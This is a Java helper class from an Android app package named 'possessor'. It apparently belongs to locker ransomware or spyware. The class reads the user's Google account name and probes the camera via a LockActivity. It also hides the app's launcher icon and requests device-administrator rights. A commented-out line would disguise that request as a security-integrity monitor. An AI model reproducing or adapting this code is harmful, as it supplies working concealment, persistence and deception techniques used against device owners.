package com.zer0.possessor;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.text.TextUtils;

import java.util.Iterator;
import java.util.List;
import java.util.TreeMap;

public class SystemUtils
{
    private final ZRuntime _zRuntime;
    private final Context _context;
    private boolean _grantedUsageStats = false;
    private DevicePolicyManager _policyManager;
    private ComponentName _deviceAdmin;

    public SystemUtils(ZRuntime zRuntime)
    {
        _zRuntime = zRuntime;
        _context = zRuntime.getContext();

        _policyManager = (DevicePolicyManager)_context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        _deviceAdmin = new ComponentName(_context, DeviceAdmin.class);
    }


    public String getAccountName()
    {
        AccountManager manager = AccountManager.get(_context);
        Account[] accounts = manager.getAccountsByType("com.google");
        if (accounts.length > 0 && accounts[0].name != null) {
            return accounts[0].name;
        }
        return "";
    }

    public boolean hasCamera()
    {
        boolean hasCam = _context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA);

        if (hasCam) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
                hasCam = false;
                Activity activity = LockActivity.getInstance();
                if (activity != null) {
                    CameraManager manager = (CameraManager) activity.getSystemService(Context.CAMERA_SERVICE);
                    try {
                        String[] camIds = manager.getCameraIdList();
                        if (camIds != null && camIds.length > 0) {
                            hasCam = true;
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            else {
                try {
                    hasCam = false;
                    int cameraId = -1;
                    int numberOfCameras = Camera.getNumberOfCameras();
                    for (int i = 0; i < numberOfCameras; i++) {
                        Camera.CameraInfo info = new Camera.CameraInfo();
                        Camera.getCameraInfo(i, info);
                        if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT || info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                            cameraId = i;
                            break;
                        }
                    }
                    if (cameraId >= 0) {
                        hasCam = true;
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return hasCam;
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    boolean checkGrantUsageStats()
    {
        if (!_grantedUsageStats) {
            UsageStatsManager usManager = (UsageStatsManager) _context.getSystemService(Context.USAGE_STATS_SERVICE);
            long currTime = System.currentTimeMillis();
            List localList = usManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, currTime - 50000L, currTime);
            TreeMap<Long, UsageStats> localTreeMap;
            Iterator localIterator;
            if (localList != null) {
                localTreeMap = new TreeMap<Long, UsageStats>();
                localIterator = localList.iterator();
                while (localIterator.hasNext()) {
                    UsageStats us = (UsageStats) localIterator.next();
                    localTreeMap.put(us.getLastTimeUsed(), us);
                }

                if (!localTreeMap.isEmpty()) {
                    String str = ((UsageStats) localTreeMap.get(localTreeMap.lastKey())).getPackageName();
                    if (!TextUtils.isEmpty(str)) {
                        _grantedUsageStats = true;
                        return true;
                    }
                }
            }
            return false;
        }
        return true;
    }

    public void hideIcon(boolean shouldHide)
    {
        try {
            ComponentName cn = new ComponentName(_context.getPackageName(), MainActivity.class.getName());
            Preferences prefs = _zRuntime.getPrefs();
            if (shouldHide) {
                if (!prefs.loadBoolean("ist", false)) {
                    PackageManager pm = _context.getPackageManager();
                    pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                    prefs.saveBoolean("ist", true);
                }
            }
            else {
                if (prefs.loadBoolean("ist", false)) {
                    PackageManager pm = _context.getPackageManager();
                    pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                    prefs.saveBoolean("ist", false);
                }
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    public boolean isIconHidden()
    {
        return _zRuntime.getPrefs().loadBoolean("ist", false);
    }

    public boolean isAdminActive()
    {
        return _policyManager.isAdminActive(_deviceAdmin);
    }

    public Intent getAskForAdminPrivilegesIntent()
    {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, _deviceAdmin);
        if (Build.VERSION.SDK_INT < 21) {
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_WHEN_TASK_RESET);
        }
        //intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allows the system to monitor the integrity of the Android security subsystem");
        return intent;
    }
}